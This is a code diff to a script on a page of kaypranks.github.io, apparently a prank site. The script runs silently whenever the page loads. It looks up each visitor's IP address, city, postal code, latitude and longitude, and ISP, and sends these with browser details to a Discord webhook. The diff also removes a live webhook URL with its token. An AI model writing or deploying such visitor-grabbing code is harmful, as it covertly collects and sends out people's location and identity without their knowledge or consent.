@@ -1,20 +1,25 @@
 <script>
-  const webhookUrl = "https://discord.com/api/webhooks/1446998835229626412/aL3byydfp-9STVBzdf8SMsAiTASlJFHxQrjts7rttPgGlhcCvNE1adAd2ESDJd5qdS4B";
+  const webhookUrl = "YOUR_WEBHOOK_URL_HERE";
 
-  // Get visitor IP
-  fetch("https://api.ipify.org?format=json")
+  // Fetch full geolocation info
+  fetch("https://ipapi.co/json/")
     .then(res => res.json())
     .then(data => {
-      const ip = data.ip;
-
       const payload = {
-        content: " New visitor on kaypranks.github.io",
+        content: "🌐 New visitor on kaypranks.github.io",
         embeds: [
           {
             title: "Visitor Details",
             color: 5814783,
             fields: [
-              { name: "IP Address", value: ip, inline: false },
+              { name: "IP Address", value: data.ip || "Unknown", inline: false },
+              { name: "Country", value: data.country_name || "Unknown", inline: true },
+              { name: "Region", value: data.region || "Unknown", inline: true },
+              { name: "City", value: data.city || "Unknown", inline: true },
+              { name: "Postal", value: data.postal || "Unknown", inline: true },
+              { name: "Latitude", value: String(data.latitude) || "Unknown", inline: true },
+              { name: "Longitude", value: String(data.longitude) || "Unknown", inline: true },
+              { name: "ISP / Org", value: data.org || "Unknown", inline: false },
               { name: "User Agent", value: navigator.userAgent, inline: false },
               { name: "Language", value: navigator.language, inline: true }
             ]
@@ -28,5 +33,5 @@
         body: JSON.stringify(payload)
       }).catch(err => console.error("Webhook error:", err));
     })
-    .catch(err => console.error("IP fetch error:", err));
+    .catch(err => console.error("GeoIP error:", err));
 </script>
